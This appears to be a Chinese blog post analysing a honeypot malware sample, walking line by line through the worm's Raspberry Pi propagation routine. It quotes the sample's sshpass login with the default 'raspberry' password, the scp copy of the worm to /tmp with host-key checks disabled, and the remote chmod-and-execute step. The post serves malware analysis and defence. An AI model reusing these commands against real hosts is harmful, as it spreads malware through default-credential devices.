ailx10说：这篇是我2024年6月写的。前一篇样本总览里，树莓派传播那段让我想单独拿出来读。脚本用 sshpass 认证，scp 把文件送到对方的临时目录，成功后还记下 IP，再通过 SSH 赋权、执行，继续放到后台。每条命令单看都熟，连在一起就成了一次从这台机器走向下一台的安排。我按顺序把它还原成文，也让前面说的“会横向移动”不再只是一个总结词。它是同一个样本的一块切片，读细以后，传播过程反而比总体介绍更清楚。

---

本文拆解蜜罐样本中的 sshpass 和 scp 传播步骤。发送文件与远程执行是不同操作，不能仅凭复制成功证明执行成功。

1、`sshpass`命令

```
sshpass -praspberry 
```

sshpass 支持非交互密码认证；raspberry 曾用于一些树莓派历史默认配置，不代表现有设备都使用该密码。

`sshpass`命令用法简介如下：

```
# 在远程主机上执行命令<cmd>
$ sshpass -p password ssh username@host <cmd>

# 通过scp上传local_file文件到远程主机，并重命名为remote_file
$ sshpass -p password scp local_file root@host:remote_file 
```

2、`scp`命令

```
scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no 
$MYSELF pi@$IP:/tmp/$NAME  
```

使用`scp`命令将本地文件（由变量`$MYSELF`表示）复制到远程主机（由变量`$IP`表示）的`/tmp`目录下，并命名为`$NAME`。`scp`命令的几个`-o`选项分别设置了连接超时时间、密码提示次数、首选认证方式、禁用已知主机文件和严格的主机密钥![原文图表](/notes-assets/1dcd026e3db7a86275be.svg)检查。

3、`echo`命令追加写入

```
&& echo $IP >> /opt/.r 
```

原脚本在 scp 成功后把地址写入本地记录；这不证明后续远程命令成功。

4、`sshpass`命令和`ssh`命令

```
&& sshpass -praspberry 
ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no 
```

使用`sshpass`和`ssh`命令登录到远程主机。同样，它使用了和上面`scp`命令相同的密码和认证设置。

5、在远程主机上执行的命令

```
"cd /tmp && chmod +x $NAME && bash -c ./$NAME" &
```

首先进入`/tmp`目录，然后给`$NAME`文件添加执行权限，最后使用`bash`执行这个文件。

![](/notes-assets/749db4d6e495ee7e7c8d.webp)

默认密码只属于特定历史配置，不代表今天每台设备。发现一个IP写进日志后，还得继续核对远端是否执行、以什么身份执行，才能确定传播效果。
